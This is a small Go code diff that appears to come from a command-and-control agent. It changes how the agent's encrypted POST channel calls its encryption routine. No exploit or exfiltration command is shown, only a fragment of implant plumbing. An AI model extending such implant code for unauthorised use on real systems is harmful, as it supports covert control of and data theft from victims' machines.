@@ -235,7 +235,7 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	//log.Println("Sending POST request to url: ", url)
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.AesPSK) != 0 {
-		sendData = c.encryptMessage(sendData)
+		sendData = EncryptMessage(sendData)
 	}
 
 	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
